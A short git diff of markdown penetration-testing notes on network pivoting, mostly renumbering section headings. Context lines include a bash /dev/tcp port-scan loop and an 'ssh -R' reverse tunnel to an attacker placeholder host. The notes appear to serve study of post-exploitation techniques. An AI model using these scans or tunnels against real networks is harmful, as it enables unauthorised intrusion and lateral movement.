@@ -385,7 +385,7 @@ Example pivoting tools
 
 ## 5. Pivoting Enumeration
 
-## Enumerate compromised host
+### Enumerate compromised host
 
 In order of preferences
 
@@ -426,7 +426,7 @@ Port scanning - takes a long time however
 for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
 ```
 
-## Proxychains and FoxyProxy
+## 6. Proxychains and FoxyProxy
 
 ### Proxychains
 
@@ -556,3 +556,5 @@ ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
 ```
 
 To kill any connections use `ps aux | grep ssh` then `sudo kill PID`
+
+## 7 Pivoting - plink.exe
